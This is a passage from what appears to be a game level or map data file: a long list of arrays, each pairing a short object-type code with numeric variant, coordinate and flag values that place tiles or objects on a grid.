"cs", 0, 23, 14, 1], [1, "cs", 2, 24, 10, 1], [1, "cs", 2, 24, 11, 1], [1, "cs", 2, 24, 12, 1], [1, "cs", 2, 24, 13, 1], [1, "cs", 1, 23, 10, 1], [1, "cs", 0, 22, 8, 1], [1, "cs", 0, 22, 12, 1], [1, "cs", 1, 23, 8, 1], [1, "cs", 2, 24, 8, 1], [1, "cs", 2, 24, 9, 1], [1, "cs", 2, 23, 9, 1], [1, "cs", 2, 22, 9, 1], [1, "cs", 2, 22, 10, 1], [1, "cs", 2, 22, 11, 1], [1, "cs", 2, 23, 11, 1], [1, "cs", 2, 23, 12, 1], [1, "cs", 2, 23, 13, 1], [1, "cs", 2, 22, 13, 1], [1, "cs", 2, 21, 9, 1], [1, "cs", 2, 21, 8, 1], [1, "cs", 2, 29, 25, 1], [1, "cs", 2, 25, 24, 1], [1, "cs", 2, 26, 25, 1], [1, "cs", 2, 27, 25, 1], [1, "cs", 0, 28, 25, 1], [1, "cs", 1, 25, 23, 1], [1, "cs", 2, 26, 24, 1], [1, "cs", 0, 24, 25, 1], [1, "cs", 3, 23, 24, 1], [1, "cs", 3, 24, 24, 1], [1, "cs", 3, 25, 25, 1], [1, "cs", 3, 23, 25, 1], [1, "cs", 1, 22, 26, 1], [1, "cs", 1, 26, 26, 1], [1, "cs", 1, 29, 26, 1], [1, "cs", 2, 23, 26, 1], [1, "cs", 2, 24, 26, 1], [1, "cs", 2, 25, 26, 1], [1, "cs", 2, 27, 26, 1], [1, "cs", 2, 28, 26, 1], [1, "cs", 2, 30, 26, 1], [1, "cs", 2, 29, 27, 1], [1, "cs", 2, 28, 28, 1], [1, "cs", 1, 26, 29, 1], [1, "cs", 0, 28, 27, 1], [1, "cs", 2, 27, 28, 1], [1, "cs", 2, 27, 27, 1], [1, "cs", 2, 26, 28, 1], [1, "cs", 2, 26, 27, 1], [1, "cs", 2, 25, 28, 1], [1, "cs", 2, 25, 27, 1], [1, "cs", 2, 23, 27, 1], [1, "cs", 2, 22, 27, 1], [1, "cs", 2, 24, 27, 1], [1, "cs", 0, 24, 28, 1], [1, "cs", 0, 25, 32, 1], [1, "cs", 1, 24, 30, 1], [1, "cs", 2, 25, 31, 1], [1, "cs", 2, 25, 30, 1], [1, "cs", 2, 25, 29, 1], [1, "cs", 2, 24, 29, 1], [1, "cs", 2, 23, 29, 1], [1, "cs", 2, 26, 33, 1], [1, "cs", 0, 26, 34, 1], [1, "cs", 2, 27, 35, 1], [1, "cs", 2, 22, 28, 1], [1, "cs", 2, 23, 28, 1], [1, "cs", 2, 24, 31, 1], [1, "cs", 2, 24, 32, 1], [1, "cs", 2, 25, 33, 1], [1, "cs", 2, 26, 35, 1], [1, "cs", 2, 24, 33, 1], [1, "cs", 2, 25, 34, 1], [1, "cs", 1, 22, 29, 1], [1, "cs", 1, 24, 34, 1], [1, "cs", 0, 23, 35, 1], [1, "cs", 2, 25, 35, 1], [1, "cs", 2, 24, 35, 1], [1, "cs", 2, 23, 34, 1], [1, "cs", 2, 23, 33, 1], [1, "cs", 0, 22, 33, 1], [1, "cs", 1, 23, 32, 1], [1, "cs", 2, 22, 32, 1], [1, "cs", 2, 23, 31, 1], [1, "cs", 2, 23, 30, 1], [1, "cs", 2, 22, 30, 1], [1, "cs", 2, 22, 31, 1], [1, "cs", 1, 21, 31, 1], [1, "cs", 0, 21, 29, 1], [1, "cs", 2, 21, 30, 1], [1, "cs", 2, 24, 36, 1], [1, "cs", 2, 26, 36, 1], [1, "cs", 2, 25, 36, 1], [1, "cs", 2, 27, 36, 1], [1, "cs", 2, 28, 36, 1], [1, "d", 2, 83, 65, 1], [1, "d", 2, 16, 67, 1], [1, "g", 0, 15, 17, 1], [1, "s", 0, 18, 13, 1], [1, "s", 0, 85, 11, 1], [1, "f", 0, 41, 102, 1], [1, "f", 0, 42, 124, 1], [1, "f", 0, 64, 116, 1], [1, "f", 0, 74, 104, 1], [1, "f", 0, 70, 87, 1], [1, "f", 0, 27, 96, 1], [1, "f", 0, 22, 79, 1], [1, "f", 0, 20, 117, 1], [1, "f", 0, 30, 137, 1], [1, "f", 0, 59, 146, 1], [1, "f", 0, 52, 147, 1], [1, "f", 0, 20, 149, 1], [1, "f", 0, 36, 146, 1], [1, "f", 0, 62, 124, 1], [1, "g", 1, 34, 121, 1], [1, "g", 1, 52, 116, 1], [1, "g", 1, 78, 116, 1], [1, "g", 1, 71, 129, 1], [1, "s", 0, 53, 100, 1], [1, "s", 0, 73, 111, 1], [1, "s", 0, 77, 126, 1], [1, "s", 0, 48, 90, 1], [1, "s", 0, 19, 102, 1], [1, "s", 0, 18, 127, 1], [1, "s", 0, 35, 159, 1], [1, "s", 0, 65, 54, 1], [1, "s", 0, 44, 52, 1], [1, "s", 0, 26, 51, 1], [1, "f", 1, 56, 136, 1], [1, "f", 1, 41, 133, 1], [1, "f", 1, 80, 120, 1], [1, "f", 1, 16, 117, 1], [1, "f", 1, 13, 99, 1], [1, "f", 1, 17, 89, 1], [1, "f", 1, 90, 98, 1], [1, "f", 1, 84, 95, 1], [1, "f", 1, 16, 57, 1], [1, "f", 1, 77, 53, 1], [1, "d", 1, 48, 35, 1], [1, "de", 8, 33, 13, 0], [1, "de", 8, 30, 9, 0], [1, "de", 9, 32, 30, 0], [1, "de", 10, 30, 25, 0], [1, "de", 10, 33, 21, 0], [1, "de", 8, 31, 34, 0], [1, "de", 8, 67, 29, 0], [1, "de", 9, 70, 22, 0], [1, "de", 10, 70, 16, 0], [1, "de", 10, 75, 11, 0], [1, "de", 8, 68, 10, 0], [1, "de", 8, 75, 30, 0], [1, "de", 11, 71, 33, 0], [1, "de", 11, 72, 25, 0], [1, "de", 11, 64, 25, 0], [1, "de", 11, 52, 10, 0], [1, "de", 11, 31, 15, 0], [1, "de", 30, 29, 14, 0], [1, "de", 30, 36, 15, 0], [1, "de", 30, 34, 29, 0], [1, "de", 30, 30, 29, 0], [1, "de", 30, 71, 29, 0], [1, "de", 28, 68, 25, 0], [1, "de", 28, 75, 15, 0], [1, "de", 27, 67, 19, 0], [1, "de", 29, 72, 10, 0], [1, "de", 29, 75, 32, 0], [1, "de", 29, 32, 20, 0], [1, "fo", 1, 39, 12, 0], [1, "fo", 1, 34, 14, 0], [1, "fo", 1, 74, 28, 0], [1, "fo", 2, 74, 29, 0], [1, "fo", 2, 69, 30, 0], [1, "fo", 2, 77, 22, 0], [1, "fo", 2, 74, 21, 0], [1, "fo", 2, 76, 18, 0], [1, "fo", 1, 78, 17, 0], [1, "fo", 1, 28, 19, 0], [1, "fo", 2, 27, 24, 0], [1, "fo", 2, 24, 17, 0], [1, "fo", 2, 29, 21, 0], [1, "fo", 1, 27, 32, 0], [1, "fo", 2, 30, 33, 0], [1, "fo", 1, 29, 28, 0], [1, "fo", 2, 28, 31, 0], [1, "fo", 2, 20, 24, 0], [1, "fo", 2, 20, 26, 0], [1, "fo", 2, 23, 16, 0], [1, "fo", 2, 11, 25, 0], [1, "de", 33, 29, 22, 0], [1, "de", 34, 32, 25, 0], [1, "de", 34, 30, 18, 0], [1, "de", 33, 78, 18, 0], [1, "de", 33, 73, 35, 0], [1, "de", 36, 72, 23, 0], [1, "de", 35, 25, 18, 0], [1, "d", 1, 83, 41, 1], [1, "d", 1, 17, 40, 1], [1, "cs", 2, 224, 104, 1], [1, "cs", 0, 224, 105, 1], [1, "cs", 3, 224, 106, 1], [1, "la", 3, 216, 128, 1], [1, "la", 0, 215, 126, 1], [1, "s", 0, 216, 130, 1], [1, "s", 1, 217, 129, 1], [1, "s", 0, 218, 128, 1], [1, "s", 1, 217, 127, 1], [1, "s", 0, 217, 126, 1], [1, "s", 1, 217, 125, 1], [1, "s", 0, 216, 124, 1], [1, "s", 1, 215, 124, 1], [1, "s", 0, 214, 124, 1], [1, "s", 1, 213, 125, 1], [1, "s", 0, 213, 126, 1], [1, "plm", 2, 217, 130, 0], [1, "plm", 2, 212, 125, 0], [1, "p", 0, 214, 134, 1], [1, "s", 1, 211, 126, 1], [1, "b", 1, 45, 277, 0], [1, "b", 1, 50, 286, 0], [1, "b", 2, 51, 284, 0], [1, "b", 1, 47, 287, 0], [1, "b", 0, 39, 285, 0], [1, "b", 3, 40, 283, 0], [1, "b", 0, 52, 283, 0], [1, "b", 1, 51, 280, 0], [1, "g", 0, 45, 269, 1], [1, "p", 0, 55, 281, 1], [1, "b", 1, 5, 172, 0], [1, "b", 2, 6, 172, 0], [1, "t", 5, 6, 171, 0], [1, "t", 1, 5, 170, 0], [1, "t", 1, 5, 164, 0], [1, "t", 3, 6, 164, 0], [1, "b", 0, 6, 165, 0], [1, "t", 3, 5, 165, 0], [1, "b", 2, 6, 166, 0], [1, "t", 4, 5, 166, 0], [1, "t", 4, 6, 167, 0], [1, "t", 2, 6, 168, 0], [1, "t", 0, 6, 169, 0], [1, "t", 4, 6, 170, 0], [1, "t", 0, 5, 167, 0], [1, "t", 2, 5, 169, 0], [1, "b", 0, 5, 168, 0], [1, "s", 1, 7, 153, 1], [1, "s", 2, 7, 151, 1], [1, "de", 5, 7, 152, 0], [1, "t", 1, 5, 154, 0], [1, "b", 0, 6, 154, 0], [1, "t", 2, 6, 155, 0], [1, "b", 2, 6, 156, 0], [1, "t", 2, 5, 157, 0], [1, "t", 4, 5, 155, 0], [1, "b", 0, 6, 157, 0], [1, "t", 1, 5, 156, 0], [1, "t", 5, 6, 158, 0], [1, "b", 2, 6, 159, 0], [1, "b", 0, 6, 162, 0], [1, "t", 4, 6, 163, 0], [1, "t", 4, 6, 161, 0], [1, "b", 1, 6, 160, 0], [1, "b", 2, 5, 163, 0], [1, "b", 2, 5, 158, 0], [1, "b", 2, 5, 161, 0], [1, "t", 1, 5, 162, 0], [1, "t", 1, 5, 160, 0], [1, "b", 1, 85, 176, 0], [1, "b", 2, 83, 178, 0], [1, "s", 1, 82, 177, 1], [1, "b", 0, 76, 172, 0], [1, "b", 3, 76, 174, 0], [1, "t", 3, 73, 174, 0], [1, "t", 5, 72, 175, 0], [1, "t", 5, 87, 173, 0], [1, "de", 2, 76, 175, 0], [1, "de", 3, 77, 171, 0], [1, "de", 3, 86, 177, 0], [1, "de", 2, 71, 175, 0], [1, "s", 1, 70, 174, 1], [1, "r", 48, 174, 0], [1, "r", 49, 175, 0], [1, "r", 50, 175, 0], [1, "r", 51, 175, 0], [1, "r", 51, 174, 0], [1, "r", 50, 174, 0], [1, "r", 49, 174, 0], [1, "r", 52, 175, 0], [1, "r", 52, 176, 0], [1, "r", 51, 176, 0], [1, "r", 50, 176, 0], [1, "r", 49, 176, 0], [1, "r", 48, 175, 0], [1, "r", 47, 175, 0], [1, "r", 48, 176, 0], [1, "r", 69, 163, 0], [1, "r", 70, 163, 0], [1, "r", 71, 163, 0], [1, "r", 73, 163, 0], [1, "r", 72, 163, 0], [1, "r", 73, 164, 0], [1, "r", 72, 164, 0], [1, "r", 71, 164, 0], [1, "r", 70, 164, 0], [1, "r", 69, 164, 0], [1, "r", 68, 164, 0], [1, "r", 68, 165, 0], [1, "r", 69, 165, 0], [1, "r", 70, 165, 0], [1, "r", 71, 165, 0], [1, "r", 72, 165, 0], [1, "r", 74, 164, 0], [1, "r", 73, 165, 0], [1, "r", 72, 166, 0], [1, "r", 71, 166, 0], [1, "r", 70, 166, 0], [1, "r", 74, 165, 0], [1, "r", 24, 164, 0], [1, "r", 25, 164, 0], [1, "r", 27, 164, 0], [1, "r", 26, 164, 0], [1, "r", 28, 165, 0], [1, "r", 26, 165, 0], [1, "r", 27, 165, 0], [1, "r", 25, 165, 0], [1, "r", 24, 165, 0], [1, "r", 23, 165, 0], [1, "r", 22, 165, 0], [1, "r", 21, 165, 0], [1, "r", 21, 166, 0], [1, "r", 22, 166, 0], [1, "r", 23, 166, 0], [1, "r", 24, 166, 0], [1, "r", 25, 166, 0], [1, "r", 26, 166, 0], [1, "r", 27, 166, 0], [1, "r", 28, 166, 0], [1, "r", 28, 167, 0], [1, "r", 26, 167, 0], [1, "r", 25, 167, 0], [1, "r", 24, 167, 0], [1, "r", 23, 167, 0], [1, "r", 22, 167, 0], [1, "r", 27, 167, 0], [1, "r", 29, 166, 0], [1, "r", 29, 167, 0], [1, "r", 28, 168, 0], [1, "r", 27, 168, 0], [1, "r", 26, 168, 0], [1, "r", 25, 168, 0], [1, "r", 24, 168, 0], [1, "r", 23, 168, 0], [1, "r", 27, 169, 0], [1, "r", 26, 169, 0], [1, "r", 25, 169, 0], [1, "r", 24, 169, 0], [1, "r", 23, 169, 0], [1, "r", 22, 168, 0], [1, "r", 21, 167, 0], [1, "s", 1, 52, 174, 1], [1, "t", 3, 50, 177, 0], [1, "t", 4, 49, 177, 0], [1, "b", 0, 47, 174, 0], [1, "b", 0, 69, 166, 0], [1, "t", 2, 68, 166, 0], [1, "t", 5, 74, 163, 0], [1, "t", 1, 73, 162, 0], [1, "s", 0, 73, 166, 1], [1, "s", 2, 76, 165, 1], [1, "g", 2, 59, 175, 1], [1, "p", 0, 78, 168, 1], [1, "p", 0, 61, 162, 1], [1, "p", 0, 42, 170, 1], [1, "p", 0, 20, 174, 1], [1, "p", 0, 16, 160, 1], [1, "b", 1, 23, 164, 0], [1, "b", 1, 28, 169, 0], [1, "b", 2, 29, 168, 0], [1, "b", 2, 16, 170, 0], [1, "t", 1, 15, 171, 0], [1, "t", 5, 13, 175, 0], [1, "t", 5, 19, 166, 0], [1, "t", 5, 26, 163, 0], [1, "s", 1, 29, 165, 1], [1, "t", 5, 11, 167, 0], [1, "t", 0, 29, 176, 0], [1, "b", 2, 30, 175, 0], [1, "t", 2, 24, 177, 0], [1, "b", 1, 37, 174, 0], [1, "b", 0, 35, 172, 0], [1, "b", 3, 37, 170, 0], [1, "t", 4, 38, 169, 0], [1, "t", 4, 34, 173, 0], [1, "t", 5, 38, 175, 0], [1, "b", 2, 39, 173, 0], [1, "t", 3, 37, 176, 0], [1, "t", 4, 30, 168, 0], [1, "s", 2, 35, 176, 1], [1, "s", 1, 41, 175, 1], [1, "b", 2, 53, 176, 0], [1, "t", 5, 55, 173, 0], [1, "t", 5, 45, 170, 0], [1, "b", 1, 53, 162, 0], [1, "b", 0, 50, 164, 0], [1, "t", 2, 54, 163, 0], [1, "t", 3, 49, 165, 0], [1, "t", 4, 48, 160, 0], [1, "t", 4, 57, 164, 0], [1, "t", 4, 66, 162, 0], [1, "b", 1, 86, 161, 0], [1, "b", 2, 81, 163, 0], [1, "t", 3, 85, 162, 0], [1, "t", 5, 81, 162, 0], [1, "t", 5, 88, 163, 0], [1, "t", 1, 84, 166, 0], [1, "t", 5, 72, 160, 0], [1, "t", 5, 70, 170, 0], [1, "s", 1, 57, 162, 1], [1, "b", 1, 39, 161, 0], [1, "b", 0, 34, 164, 0], [1, "b", 2, 54, 164, 0], [1, "t", 1, 59, 169, 0], [1, "t", 3, 60, 170, 0], [1, "t", 4, 63, 169, 0], [1, "t", 4, 63, 174, 0], [1, "t", 1, 62, 175, 0], [1, "t", 5, 40, 162, 0], [1, "t", 1, 63, 180, 0], [1, "t", 2, 64, 179, 0], [1, "t", 2, 35, 165, 0], [1, "s", 1, 63, 173, 1], [1, "s", 2, 40, 165, 1], [1, "b", 0, 46, 169, 0], [1, "de", 22, 74, 168, 0], [1, "de", 22, 86, 168, 0], [1, "de", 22, 83, 175, 0], [1, "de", 22, 78, 175, 0], [1, "de", 19, 72, 176, 0], [1, "de", 19, 68, 168, 0], [1, "de", 19, 65, 163, 0], [1, "de", 19, 75, 162, 0], [1, "de", 19, 80, 162, 0], [1, "de", 19, 88, 159, 0], [1, "de", 19, 87, 164, 0], [1, "de", 19, 61, 177, 0], [1, "de", 19, 59, 172, 0], [1, "de", 19, 59, 167, 0], [1, "de", 19, 53, 165, 0], [1, "de", 19, 56, 163, 0], [1, "de", 19, 51, 161, 0], [1, "de", 19, 48, 167, 0], [1, "de", 19, 47, 170, 0], [1, "de", 19, 41, 163, 0], [1, "de", 19, 37, 161, 0], [1, "de", 19, 36, 166, 0], [1, "de", 19, 36, 171, 0], [1, "de", 19, 34, 174, 0], [1, "de", 19, 40, 172, 0], [1, "de", 19, 38, 177, 0], [1, "de", 19, 42, 176, 0], [1, "de", 19, 53, 178, 0], [1, "de", 19, 53, 172, 0], [1, "de", 19, 64, 181, 0], [1, "de", 19, 64, 175, 0], [1, "de", 19, 79, 172, 0], [1, "de", 19, 30, 170, 0], [1, "de", 19, 17, 168, 0], [1, "de", 19, 14, 173, 0], [1, "de", 19, 12, 162, 0], [1, "de", 19, 9, 167, 0], [1, "de", 19, 20, 161, 0], [1, "de", 19, 27, 162, 0], [1, "de", 19, 83, 195, 0], [1, "de", 2, 85, 163, 0], [1, "de", 2, 80, 164, 0], [1, "de", 2, 84, 169, 0], [1, "de", 2, 55, 165, 0], [1, "de", 3, 46, 163, 0], [1, "de", 2, 66, 169, 0], [1, "de", 0, 63, 175, 0], [1, "de", 0, 34, 164, 0], [1, "de", 0, 18, 160, 0], [1, "de", 2, 40, 160, 0], [1, "de", 2, 53, 160, 0], [1, "de", 2, 14, 170, 0], [1, "de", 2, 19, 175, 0], [1, "de", 2, 23, 176, 0], [1, "de", 5, 60, 147, 0], [1, "de", 33, 59, 160, 0], [1, "de", 33, 85, 157, 0], [1, "de", 33, 29, 143, 0], [1, "de", 33, 62, 140, 0], [1, "de", 33, 43, 127, 0], [1, "de", 33, 18, 129, 0], [1, "de", 33, 50, 134, 0], [1, "de", 33, 79, 127, 0], [1, "de", 33, 89, 139, 0], [1, "b", 1, 44, 156, 0], [1, "t", 2, 45, 157, 0], [1, "b", 0, 75, 156, 0], [1, "t", 3, 76, 157, 0], [1, "t", 5, 62, 157, 0], [1, "t", 5, 79, 156, 0], [1, "t", 5, 41, 156, 0], [1, "b", 1, 28, 156, 0], [1, "t", 2, 27, 157, 0], [1, "t", 4, 21, 156, 0], [1, "t", 4, 56, 159, 0], [1, "f", 1, 94, 153, 1], [1, "f", 2, 93, 153, 1], [1, "f", 2, 99, 153, 1], [1, "f", 1, 98, 153, 1], [1, "f", 0, 97, 153, 1], [1, "f", 1, 96, 153, 1], [1, "s", 1, 7, 149, 1], [1, "de", 4, 7, 150, 0], [1, "b", 3, 43, 281, 0], [1, "de", 50, 24, 39, 0], [1, "de", 50, 21, 39, 0], [1, "de", 50, 22, 43, 0], [1, "de", 50, 15, 34, 0], [1, "de", 50, 18, 26, 0], [1, "de", 50, 44, 42, 0], [1, "de", 50, 57, 39, 0], [1, "de", 50, 62, 43, 0], [1, "de", 50, 77, 44, 0], [1, "de", 50, 71, 41, 0], [1, "de", 50, 55, 39, 0], [1, "de", 50, 22, 39, 0], [1, "de", 50, 20, 41, 0], [1, "de", 50, 18, 21, 0], [1, "de", 50, 15, 21, 0], [1, "de", 50, 18, 19, 0], [1, "de", 50, 17, 17, 0], [1, "de", 50, 18, 10, 0], [1, "de", 50, 18, 9, 0], [1, "de", 50, 52, 41, 0], [1, "de", 50, 82, 39, 0], [1, "de", 50, 86, 38, 0], [1, "de", 50, 84, 31, 0], [1, "de", 50, 86, 30, 0], [1, "de", 50, 84, 26, 0], [1, "de", 50, 86, 23, 0], [1, "de", 50, 86, 14, 0], [1, "de", 50, 29, 42, 0], [1, "de", 9, 74, 37, 0], [1, "de", 9, 76, 22, 0], [1, "de", 10, 79, 24, 0], [1, "de", 11, 77, 17, 0], [1, "de", 36, 81, 25, 0], [1, "de", 36, 80, 36, 0], [1, "de", 36, 21, 36, 0], [1, "de", 28, 23, 22, 0], [1, "de", 28, 27, 31, 0], [1, "de", 28, 69, 36, 0], [1, "de", 28, 80, 20, 0], [1, "de", 51, 24, 155, 0], [1, "de", 51, 7, 154, 0], [1, "de", 51, 11, 154, 0], [1, "de", 51, 12, 156, 0], [1, "de", 51, 16, 154, 0], [1, "de", 51, 20, 154, 0], [1, "de", 51, 23, 154, 0], [1, "de", 51, 18, 157, 0], [1, "de", 51, 31, 154, 0], [1, "de", 51, 32, 157, 0], [1, "de", 51, 86, 154, 0], [1, "de", 51, 88, 156, 0], [1, "de", 51, 82, 154, 0], [1, "de", 51, 80, 154, 0], [1, "de", 51, 77, 154, 0], [1, "de", 51, 74, 154, 0], [1, "de", 51, 71, 154, 0], [1, "de", 51, 67, 154, 0], [1, "de", 51, 60, 154, 0], [1, "de", 51, 57, 154, 0], [1, "de", 51, 65, 154, 0], [1, "de", 51, 68, 156, 0], [1, "de", 51, 59, 156, 0], [1, "de", 51, 55, 154, 0], [1, "de", 51, 54, 154, 0], [1, "de", 51, 52, 154, 0], [1, "de", 51, 55, 155, 0], [1, "de", 51, 54, 157, 0], [1, "de", 51, 49, 154, 0], [1, "de", 51, 46, 154, 0], [1, "de", 51, 44, 154, 0], [1, "de", 51, 43, 154, 0], [1, "de", 51, 41, 154, 0], [1, "de", 51, 38, 154, 0], [1, "de", 51, 39, 156, 0], [1, "de", 51, 34, 154, 0], [1, "de", 5, 19, 142, 0], [1, "de", 5, 37, 147, 0], [1, "de", 7, 53, 147, 0], [1, "de", 6, 69, 150, 0], [1, "de", 4, 94, 148, 0], [1, "de", 4, 66, 147, 0], [1, "de", 4, 10, 145, 0], [1, "de", 4, 28, 137, 0], [1, "de", 4, 15, 137, 0], [1, "de", 4, 48, 134, 0], [1, "de", 5, 67, 135, 0], [1, "de", 34, 84, 155, 0], [1, "de", 35, 70, 156, 0], [1, "de", 35, 51, 156, 0], [1, "de", 35, 56, 157, 0], [1, "de", 35, 65, 159, 0], [1, "de", 35, 23, 156, 0], [1, "de", 35, 15, 155, 0], [1, "de", 35, 8, 155, 0], [1, "de", 33, 13, 155, 0], [1, "de", 33, 33, 158, 0], [1, "de", 36, 78, 155, 0], [1, "de", 36, 87, 157, 0], [1, "fo", 1, 73, 36, 0], [1, "fo", 1, 80, 24, 0], [1, "fo", 2, 67, 36, 0], [1, "fo", 2, 45, 36, 0], [1, "fo", 2, 53, 34, 0], [1, "fo", 1, 51, 35, 0], [1, "fo", 1, 58, 35, 0], [1, "fo", 1, 33, 35, 0], [1, "fo", 1, 31, 33, 0], [1, "fo", 2, 29, 36, 0], [1, "fo", 2, 56, 36, 0], [1, "fo", 2, 60, 37, 0], [1, "fo", 2, 45, 32, 0], [1, "fo", 2, 22, 25, 0], [1, "fo", 2, 21, 35, 0], [1, "de", 52, 90, 208, 0], [1, "de", 18, 94, 250, 0], [1, "de", 17, 95, 253, 0], [1, "cs", 0, 140, 5, 1], [1, "cs", 2, 139, 5, 1], [1, "cs", 2, 138, 5, 1], [1, "cs", 2, 138, 6, 1], [1, "cs", 2, 139, 6, 1], [1, "cs", 2, 141, 6, 1], [1, "cs", 2, 140, 6, 1], [1, "la", 3, 143, 7, 1], [1, "la", 3, 139, 7, 1], [1, "cs", 0, 137, 7, 1], [1, "cs", 1, 138, 8, 1], [1, "cs", 2, 137, 6, 1], [1, "cs", 2, 137, 8, 1], [1, "cs", 2, 136, 7, 1], [1, "cs", 2, 138, 9, 1], [1, "cs", 3, 139, 9, 1], [1, "cs", 3, 136, 8, 1], [1, "cs", 3, 137, 9, 1], [1, "de", 53, 92, 165, 0], [1, "de", 53, 92, 180, 0], [1, "de", 53, 92, 188, 0], [1, "de", 54, 92, 153, 0], [1, "de", 54, 91, 153, 0], [1, "de", 54, 90, 153, 0], [1, "de", 54, 89, 153, 0], [1, "de", 54, 88, 153, 0], [1, "de", 54, 87, 153, 0], [1, "de", 54, 86, 153, 0], [1, "de", 54, 85, 153, 0], [1, "de", 54, 84, 153, 0], [1, "de", 54, 83, 153, 0], [1, "de", 54, 82, 153, 0], [1, "de", 54, 81, 153, 0], [1, "de", 54, 80, 153, 0], [1, "de", 54, 79, 153, 0], [1, "de", 54, 78, 153, 0], [1, "de", 54, 77, 153, 0], [1, "de", 54, 76, 153, 0], [1, "de", 54, 75, 153, 0], [1, "de", 54, 74, 153, 0], [1, "de", 54, 73, 153, 0], [1, "de", 54, 72, 153, 0], [1, "de", 54, 70, 153, 0], [1, "de", 54, 71, 153, 0], [1, "de", 54, 69, 153, 0], [1, "de", 54, 68, 153, 0], [1, "de", 54, 67, 153, 0], [1, "de", 54, 66, 153, 0], [1, "de", 54, 65, 153, 0], [1, "de", 54, 64, 153, 0], [1, "de", 54, 63, 153, 0], [1, "de", 54, 61, 153, 0], [1, "de", 54, 62, 153, 0], [1, "de", 54, 60, 153, 0], [1, "de", 54, 59, 153, 0], [1, "de", 54, 57, 153, 0], [1, "de", 54, 58, 153, 0], [1, "de", 54, 56, 153, 0], [1, "de", 54, 55, 153, 0], [1, "de", 54, 54, 153, 0], [1, "de", 54, 53, 153, 0], [1, "de", 54, 52, 153, 0], [1, "de", 54, 51, 153, 0], [1, "de", 54, 50, 153, 0], [1, "de", 54, 49, 153, 0], [1, "de", 54, 48, 153, 0], [1, "de", 54, 47, 153, 0], [1, "de", 54, 46, 153, 0], [1, "de", 54, 45, 153, 0], [1, "de", 54, 44, 153, 0], [1, "de", 54, 43, 153, 0], [1, "de", 54, 42, 153, 0], [1, "de", 54, 41, 153, 0], [1, "de", 54, 40, 153, 0], [1, "de", 54, 39, 153, 0], [1, "de", 54, 37, 153, 0], [1, "de", 54, 38, 153, 0], [1, "de", 54, 36, 153, 0], [1, "de", 54, 35, 153, 0], [1, "de", 54, 34, 153, 0], [1, "de", 54, 33, 153, 0], [1, "de", 54, 32, 153, 0], [1, "de", 54, 31, 153, 0], [1, "de", 54, 30, 153, 0], [1, "de", 54, 29, 153, 0], [1, "de", 54, 28, 153, 0], [1, "de", 54, 27, 153, 0], [1, "de", 54, 26, 153, 0], [1, "de", 54, 25, 153, 0], [1, "de", 54, 24, 153, 0], [1, "de", 54, 23, 153, 0], [1, "de", 54, 22, 153, 0], [1, "de", 54, 21, 153, 0], [1, "de", 54, 20, 153, 0], [1, "de", 54, 19, 153, 0], [1, "de", 54, 18, 153, 0], [1, "de", 54, 17, 153, 0], [1, "de", 54, 16, 153, 0], [1, "de", 54, 15, 153, 0], [1, "de", 54, 14, 153, 0], [1, "de", 54, 13, 153, 0], [1, "de", 54, 12, 153, 0], [1, "de", 54, 11, 153, 0], [1, "de", 54, 10, 153, 0], [1, "de", 54, 8, 153, 0], [1, "de", 54, 9, 153, 0], [1, "de", 55, 83, 8, 0], [1, "de", 55, 83, 9, 0], [1, "de", 55, 83, 10, 0], [1, "de", 55, 83, 11, 0], [1, "de", 55, 83, 12, 0], [1, "de", 55, 83, 13, 0], [1, "de", 55, 83, 14, 0], [1, "de", 55, 83, 15, 0], [1, "de", 55, 83, 16, 0], [1, "de", 55, 83, 17, 0], [1, "de", 55, 83, 19, 0], [1, "de", 55, 83, 18, 0], [1, "de", 55, 83, 20, 0], [1, "de", 55, 83, 21, 0], [1, "de", 55, 83, 22, 0], [1, "de", 55, 83, 23, 0], [1, "de", 55, 83, 24, 0], [1, "de", 55, 83, 25, 0], [1, "de", 55, 83, 26, 0], [1, "de", 55, 83, 27, 0], [1, "de", 55, 83, 28, 0], [1, "de", 55, 83, 29, 0], [1, "de", 55, 83, 30, 0], [1, "de", 55, 83, 31, 0], [1, "de", 55, 83, 32, 0], [1, "de", 55, 83, 33, 0], [1, "de", 55, 83, 34, 0], [1, "de", 55, 83, 36, 0], [1, "de", 55, 83, 35, 0], [1, "de", 55, 83, 37, 0], [1, "de", 55, 83, 38, 0], [1, "de", 55, 81, 38, 0], [1, "de", 55, 82, 38, 0], [1, "de", 55, 80, 38, 0], [1, "de", 55, 79, 38, 0], [1, "de", 55, 78, 38, 0], [1, "de", 55, 77, 38, 0], [1, "de", 55, 76, 38, 0], [1, "de", 55, 75, 38, 0], [1, "de", 55, 73, 38, 0], [1, "de", 55, 74, 38, 0], [1, "de", 55, 72, 38, 0], [1, "de", 55, 71, 38, 0], [1, "de", 55, 70, 38, 0], [1, "de", 55, 68, 38, 0], [1, "de", 55, 69, 38, 0], [1, "de", 55, 67, 38, 0], [1, "de", 55, 66, 38, 0], [1, "de", 55, 65, 38, 0], [1, "de", 55, 64, 38, 0], [1, "de", 55, 63, 38, 0], [1, "de", 55, 62, 38, 0], [1, "de", 55, 60, 38, 0], [1, "de", 55, 61, 38, 0], [1, "de", 55, 59, 38, 0], [1, "de", 55, 57, 38, 0], [1, "de", 55, 58, 38, 0], [1, "de", 55, 56, 38, 0], [1, "de", 55, 55, 38, 0], [1, "de", 55, 54, 38, 0], [1, "de", 55, 53, 38, 0], [1, "de", 55, 52, 38, 0], [1, "de", 55, 51, 38, 0], [1, "de", 55, 49, 38, 0], [1, "de", 55, 50, 38, 0], [1, "de", 55, 48, 38, 0], [1, "de", 55, 47, 38, 0], [1, "de", 55, 46, 38, 0], [1, "de", 55, 45, 38, 0], [1, "de", 55, 44, 38, 0], [1, "de", 55, 43, 38, 0], [1, "de", 55, 42, 38, 0], [1, "de", 55, 41, 38, 0], [1, "de", 55, 40, 38, 0], [1, "de", 55, 39, 38, 0], [1, "de", 55, 38, 38, 0], [1, "de", 55, 37, 38, 0], [1, "de", 55, 36, 38, 0], [1, "de", 55, 34, 38, 0], [1, "de", 55, 35, 38, 0], [1, "de", 55, 33, 38, 0], [1, "de", 55, 31, 38, 0], [1, "de", 55, 32, 38, 0], [1, "de", 55, 30, 38, 0], [1, "de", 55, 29, 38, 0], [1, "de", 55, 28, 38, 0], [1, "de", 55, 27, 38, 0], [1, "de", 55, 26, 38, 0], [1, "de", 55, 25, 38, 0], [1, "de", 55, 24, 38, 0], [1, "de", 55, 23, 38, 0], [1, "de", 55, 21, 38, 0], [1, "de", 55, 22, 38, 0], [1, "de", 55, 20, 38, 0], [1, "de", 55, 19, 38, 0], [1, "de", 55, 19, 37, 0], [1, "de", 55, 19, 36, 0], [1, "de", 55, 19, 35, 0], [1, "de", 55, 19, 34, 0], 